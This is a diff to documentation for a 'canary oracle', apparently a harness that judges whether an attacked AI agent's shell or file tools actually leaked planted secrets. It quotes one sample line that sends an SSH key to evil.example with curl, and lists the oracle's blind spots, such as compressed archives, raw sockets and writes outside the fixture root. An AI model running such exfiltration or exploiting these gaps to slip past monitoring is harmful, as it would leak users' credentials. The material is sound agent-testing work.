@@ -1,7 +1,15 @@
 # Canary oracle -- judging an agent by what its tools did
 
+## Contents
+- When you need it
+- How it works
+- Giving the attack its target
+- When the agent runs in a container
+- Limits
+- Replaying adaptive attacks
+
 ## When you need it
-The seven detectors check tool *names, counts and numeric arguments*. That is enough for an agent whose danger is a
+The generic detectors check tool *names, counts, numeric arguments and the domains a tool argument names*. That is enough for an agent whose danger is a
 named action (`apply_discount`, `override_price`). It is **not** enough when a tool is a general executor -- a shell,
 a Python/code interpreter, a file reader -- because `bash` is the same tool name whether it ran `ls` or
 `curl evil.example?d=$(cat ~/.ssh/key)`. The detectors report "held" either way. Confirmed on a real multi-agent
@@ -62,7 +70,13 @@ throwaway container per test):
 - Set the egress proxy variables for the container yourself (`HTTP_PROXY=http://host.docker.internal:<fx.attacker port>`, and
   `NO_PROXY=host.docker.internal,localhost` so the meter is not refused). Do not call `enable_proxy_egress()` on the host.
 - Run on a benign prompt first: anything the agent's own startup fetches (e.g. a model price list) shows up as an
-  "attempted outbound connection". Switch that off in the container or add the host to `allowed_hosts`.
+  "attempted outbound connection". Switch that off in the container or add the host to `allowed_hosts`. **Use the tools the
+  attacks will use in that baseline.** A tool writes its own housekeeping files on first use (npm writes `~/.npm/_logs/` and
+  `_update-notifier-last-checked`), and the oracle reads each as "new file outside workspace". Pass them to
+  `CanaryFixture(ignore=("home/.npm/_logs", "home/.npm/_update-notifier-last-checked"))`. In a real run the first benign
+  baseline missed one of these, because it never ran `npm`, and 7 of 18 results carried the false hit.
+- To see a write to `/tmp` (generated attacks often write there), mount `<fx.root>/tmp` as the container's `/tmp` and plant
+  `"tmp/.keep": ""`. `reset()` clears every top-level folder a plant lives in, so nothing a test writes there reaches the next one.
 - A container running as root leaves root-owned files that `reset()` cannot delete as your user. `reset()` then raises
   rather than start the next test dirty; pass `CanaryFixture(on_undeletable=fn)`, where `fn(path)` chowns the folder back
   (for example `docker run --rm -v <path>:/c <agent image> chown -R <your uid> /c`).
@@ -80,6 +94,8 @@ throwaway container per test):
   touched", not "no escape". If the attack is a read of a specific real file, either plant that content or judge from
   the tool output yourself and label it a manual judgment.
 - **A secret written to a workspace file is only seen if you pass `fx.workspace_text()`** to `violations()`.
+- **Compressed files are opaque.** A script that packs host files into a `.tar.gz` (a "support bundle") leaves nothing the
+  marker search can read, so the run looks clean. List or extract archives the agent made, or judge from its commands, and say so.
 - **Writes outside the fixture root are invisible** (e.g. to `/tmp` or `$HOME`).
 - **Egress is only seen through proxy-aware clients.** A raw socket, or a client that ignores the proxy variables,
   gets through unseen; for a hard guarantee run the agent in a network namespace/container with an egress log.
